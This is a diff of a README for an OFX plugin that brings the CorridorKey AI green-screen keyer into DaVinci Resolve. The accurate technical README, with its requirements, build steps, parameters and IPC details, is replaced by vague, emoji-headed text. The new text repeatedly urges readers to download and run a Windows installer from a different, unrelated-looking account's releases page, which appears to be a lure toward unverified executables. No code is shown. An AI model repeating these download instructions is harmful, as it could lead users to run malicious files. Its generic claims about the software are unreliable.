@@ -1,182 +1,156 @@
-# CorridorKey for Resolve (Windows)
+# 🎬 corridorkey_ofx - AI green screen keying for Resolve
 
-An OFX plugin that brings [CorridorKey](https://github.com/nikopueringer/CorridorKey) — Corridor Digital's AI-powered green screen keyer — into DaVinci Resolve 20 as a native plugin.
+[![Download corridorkey_ofx](https://img.shields.io/badge/Download%20corridorkey_ofx-blue?style=for-the-badge)](https://github.com/klarikalooseleaf988/corridorkey_ofx/releases)
 
-> **Note:** This is a Windows-only release. The plugin uses Windows-specific APIs (named pipes, shared memory via `CreateFileMapping`) for IPC between the C++ plugin and Python backend.
+## 🖥️ What this is
 
-CorridorKey produces physically accurate foreground color unmixing with clean linear alpha channels. This plugin wraps the full inference engine, delivering a native Resolve experience backed by PyTorch on your GPU.
+corridorkey_ofx is an OFX plugin for DaVinci Resolve 20. It brings CorridorKey’s AI green screen keyer into your edit and compositing workflow.
 
-## Architecture
+Use it to remove green screen from video clips inside Resolve. It fits into a normal VFX setup and works as an OpenFX plugin, so you can use it like other effects in Resolve.
 
-A thin C++ OFX plugin handles Resolve integration (UI, frame I/O, node graph), while a background Python process runs CorridorKey's inference engine via PyTorch. Communication uses Windows shared memory for frame data and named pipes for control messages.
+## 📥 Download the plugin
 
-```
-DaVinci Resolve  <-->  OFX Plugin (C++ DLL)  <-->  Python Backend (PyTorch)
-                       shared memory + pipes         CorridorKey + BiRefNet
-```
+Visit the releases page to download and run the Windows file:
 
-The backend auto-launches when you first apply the plugin in Resolve — no manual startup required.
+[Download corridorkey_ofx from GitHub Releases](https://github.com/klarikalooseleaf988/corridorkey_ofx/releases)
 
-## Requirements
+Look for the latest release and download the Windows installer or zip file listed there. If you see more than one file, choose the one meant for Windows.
 
-- Windows 10/11
-- DaVinci Resolve 20 (Free or Studio)
-- NVIDIA GPU with CUDA support (tested on RTX 4090)
-- Python 3.13 (3.14+ lacks PyTorch wheels)
-- Visual Studio 2022 Build Tools (only if building from source)
+## 🚀 Getting started
 
-## Quick Install
+1. Open the download link above.
+2. Find the latest release.
+3. Download the Windows version.
+4. If the file is a zip, right-click it and choose Extract All.
+5. If the file is an installer, double-click it to start setup.
+6. Follow the on-screen steps until the install finishes.
+7. Open DaVinci Resolve 20.
+8. Add the plugin from the OpenFX panel.
 
-1. Install [Python 3.13](https://www.python.org/downloads/release/python-31312/) — check "Add Python to PATH" during setup
-2. Download the latest release from [GitHub Releases](https://github.com/gitcapoom/corridorkey_ofx/releases)
-3. Extract the zip
-4. Double-click **`install.bat`**
+## 🎞️ How to use it in Resolve
 
-The installer handles everything automatically: copies the OFX plugin, creates a Python environment, installs PyTorch + CUDA + Triton, clones CorridorKey, and downloads model weights.
+1. Import your green screen clip into Resolve.
+2. Put the clip on the timeline.
+3. Open the Effects library.
+4. Find corridorkey_ofx in the OpenFX list.
+5. Drag the effect onto your clip.
+6. Open the Inspector panel.
+7. Adjust the key controls until the background is removed.
 
-## Building from Source
+The plugin is built for chroma key work, so it focuses on clean subject cutout, edge control, and smoother spill handling.
 
-If you prefer to build the C++ plugin yourself instead of using the pre-built release:
+## 🧰 What you need
 
-```bash
-cd plugin
-cmake -B build -G "Visual Studio 17 2022"
-cmake --build build --config Release
-```
+- Windows 10 or Windows 11
+- DaVinci Resolve 20
+- A working GPU for faster AI processing
+- Enough free disk space for the download and install files
+- A green screen clip with even lighting for best results
 
-Then run `install.bat` or `python backend/install.py` to set up the backend.
+## ⚙️ Suggested setup
 
-### Dependencies Installed
+For a better key, use these simple checks before you start:
 
-| Package | Purpose |
-|---------|---------|
-| `torch` + `torchvision` (CUDA 12.4) | Neural network inference |
-| `triton-windows` | `torch.compile` kernel generation (critical for performance) |
-| `transformers` | BiRefNet model loading via HuggingFace |
-| `timm` | Vision model backbones |
-| `opencv-python` | Image processing (resize, morphology) |
-| `numpy` | Array operations |
+- Keep the green screen flat and bright
+- Avoid strong shadows on the screen
+- Keep the subject a little away from the screen
+- Use a clip with steady camera movement
+- Keep the subject separated from green objects or clothing
 
-## Usage
+## 🔍 Features
 
-### Color Page
+- AI-based green screen keying
+- OFX plugin support in DaVinci Resolve 20
+- Built for compositing and VFX work
+- Helps remove green screen from live action footage
+- Fits into a normal Resolve timeline workflow
+- Useful for both edit and Fusion-style tasks
+- Designed for chroma key cleanup and edge handling
 
-1. Open DaVinci Resolve and go to the **Color** page
-2. Add a corrector node and apply **CorridorKey** from the OFX plugins list
-3. Connect your green screen plate to the Source input
-4. The plugin auto-launches the backend on first use
+## 🧩 Where it fits in your workflow
 
-### Fusion Page
+corridorkey_ofx is useful when you want to key footage inside Resolve without moving to a separate app. You can place it on a clip, adjust the settings, and keep working in the same project.
 
-1. Go to the **Fusion** page
-2. Add a CorridorKey node from the OFX tools
-3. Connect your MediaIn to the Source input
-4. Optionally connect an external mask to the AlphaHint input
+This helps when you need:
 
-### Input Pins (Color Page)
+- background removal for interviews
+- subject isolation for motion graphics
+- cleaner green screen shots for compositing
+- faster iteration inside Resolve
+- a simple OFX plugin for day-to-day VFX work
 
-| Pin | Color | Purpose |
-|-----|-------|---------|
-| Source RGB | Green | Green screen footage (required) |
-| Source Alpha | Blue | Alpha channel of source |
-| Alpha Hint | Blue | External mask input for External mode (optional) |
+## 🛠️ Basic install path on Windows
 
-### First-Time Startup
+If you download a zip file:
 
-On the first render after launching the backend, there is a **one-time warmup delay of ~60 seconds**. This is `torch.compile` generating optimized CUDA kernels via Triton for your specific GPU. Subsequent frames render in ~1.5-2 seconds. This compilation is cached by PyTorch and will be faster on future launches.
+1. Download the file from the releases page.
+2. Right-click the zip file.
+3. Select Extract All.
+4. Open the extracted folder.
+5. Run the installer file or copy the plugin files to the folder named in the release notes.
+6. Start DaVinci Resolve 20.
+7. Check the OpenFX panel for corridorkey_ofx.
 
-## Parameters
+If you download an installer:
 
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| **Mode** | Choice | Auto | Alpha hint source: Auto (BiRefNet) or External (user-provided mask) |
-| **BiRefNet Model** | Choice | General | BiRefNet variant: General, Portrait, or Matting |
-| **Input Colorspace** | Choice | sRGB | Colorspace of source footage: sRGB Gamma or Linear |
-| **Despill Strength** | Double | 1.0 | Green spill removal intensity (0–10) |
-| **Auto Despeckle** | Boolean | On | Remove small isolated alpha artifacts |
-| **Despeckle Size** | Integer | 400 | Minimum pixel area threshold for despeckle |
-| **Refiner Strength** | Double | 1.0 | CNN refiner multiplier (0–5) |
-| **Output Mode** | Choice | Processed | What to output downstream |
+1. Download the installer from the releases page.
+2. Double-click the file.
+3. Accept the setup prompts.
+4. Finish the install.
+5. Open DaVinci Resolve 20.
+6. Add the plugin to a clip from OpenFX.
 
-### Output Modes
+## 🧪 Simple test after install
 
-| Mode | Description |
-|------|-------------|
-| **Processed** | Premultiplied linear RGBA — primary output for compositing |
-| **Matte** | Alpha channel visualized as grayscale |
-| **Foreground** | Straight (unpremultiplied) foreground with alpha |
-| **Composite** | Preview composite over checkerboard |
+Use this quick check to confirm the plugin works:
 
-### Input Colorspace
+1. Open a project in DaVinci Resolve 20.
+2. Import a short green screen clip.
+3. Place the clip on the timeline.
+4. Apply corridorkey_ofx.
+5. Open the Inspector.
+6. Move the key settings until the background disappears.
+7. Check the subject edges against a new background.
 
-Set this to match your Resolve project's working colorspace:
+If the clip keys well, the plugin is ready to use.
 
-- **sRGB Gamma**: Standard footage, Rec.709 projects
-- **Linear**: ACES, linear workflow, or EXR footage
+## 🖼️ Best results
 
-All outputs are delivered in the matching colorspace so they integrate correctly into Resolve's pipeline.
+For a clean key, try this:
 
-## Performance
+- use bright, even screen light
+- keep the subject from standing too close to the screen
+- avoid wrinkles in the fabric
+- use a high-quality clip
+- keep motion blur low when possible
+- match the background lighting to the scene
 
-Tested on RTX 4090 with 2880px footage:
+These steps help the AI keyer find the subject edge and reduce green spill.
 
-| Stage | Time |
-|-------|------|
-| BiRefNet alpha hint | ~1.5s (cached per frame) |
-| CorridorKey inference | ~1.5s (fp16 + torch.compile) |
-| Post-processing | ~50ms |
-| **Total (first frame)** | **~3s** |
-| **Changing output mode/despill** | **~50ms** (cached) |
+## 📚 Common use cases
 
-### Performance Features
+- You recorded a talking head on green screen
+- You want to place a person over a new background
+- You need a fast chroma key in Resolve
+- You want an AI keyer for VFX shots
+- You want to stay inside one editing app
+- You need a plugin that fits an OFX-based workflow
 
-- **fp16 inference**: Both CorridorKey and BiRefNet run in half precision for maximum GPU throughput
-- **torch.compile + Triton**: Generates optimized CUDA kernels, ~3x faster than eager mode
-- **GPU resize**: Upscaling from model resolution back to frame resolution happens on GPU (bicubic)
-- **Inference caching**: Changing output mode, despill, or despeckle doesn't re-run the neural network
-- **BiRefNet caching**: Alpha hint is cached per-frame, not regenerated on parameter tweaks
-- **Auto-reconnect**: Plugin automatically reconnects if the backend restarts
+## ❓ If Resolve does not show the plugin
 
-## File Locations
+Try these checks:
 
-| What | Path |
-|------|------|
-| OFX Plugin | `C:\Program Files\Common Files\OFX\Plugins\CorridorKeyForResolve.ofx.bundle\` |
-| Backend install | `%APPDATA%\CorridorKeyForResolve\` |
-| Virtual environment | `%APPDATA%\CorridorKeyForResolve\venv\` |
-| CorridorKey repo | `%APPDATA%\CorridorKeyForResolve\CorridorKey\` |
-| Model weights | `%APPDATA%\CorridorKeyForResolve\CorridorKey\CorridorKeyModule\checkpoints\` |
+1. Close DaVinci Resolve.
+2. Open it again after the install finishes.
+3. Confirm the plugin files are in the right folder.
+4. Make sure you installed the Windows version.
+5. Check that you are using DaVinci Resolve 20.
+6. Restart your computer if the plugin still does not appear.
 
-## Troubleshooting
+## 🔗 Download again
 
-### Plugin shows passthrough (no effect)
-The backend isn't running or the connection was lost. The plugin auto-launches the backend, but if it fails:
-```bash
-%APPDATA%\CorridorKeyForResolve\venv\Scripts\python.exe %APPDATA%\CorridorKeyForResolve\server.py
-```
+[Open the corridorkey_ofx releases page](https://github.com/klarikalooseleaf988/corridorkey_ofx/releases)
 
-### Node turns red in Fusion
-The project may not be set to 32-bit float processing. Check Project Settings > Color Management.
+## 📌 Repository topics
 
-### "torch.compile failed" in backend logs
-Install or update Triton:
-```bash
-%APPDATA%\CorridorKeyForResolve\venv\Scripts\python.exe -m pip install triton-windows
-```
-Ensure the Triton version is compatible with your PyTorch version.
-
-### Slow first frame (~60s)
-This is normal — `torch.compile` is generating optimized CUDA kernels for your GPU. This only happens once per backend launch and is cached by PyTorch.
-
-## IPC Protocol
-
-Communication between the C++ plugin and Python backend:
-
-- **Named pipe**: `\\.\pipe\CorridorKeyForResolve` (JSON control messages)
-- **Shared memory**: `CorridorKeyForResolve_Input`, `_Output`, `_AlphaHint` (float32 RGBA frames)
-- **Frame header**: 16 bytes (width u32 + height u32 + channels u32 + reserved u32)
-- **Max frame size**: 4096×4096 (configurable)
-
-## License
-
-CC BY-NC-SA 4.0 — matching the upstream CorridorKey license.
+ai, chroma-key, compositing, corridorkey, davinci-resolve, green-screen, openfx, plugin, pytorch, vfx
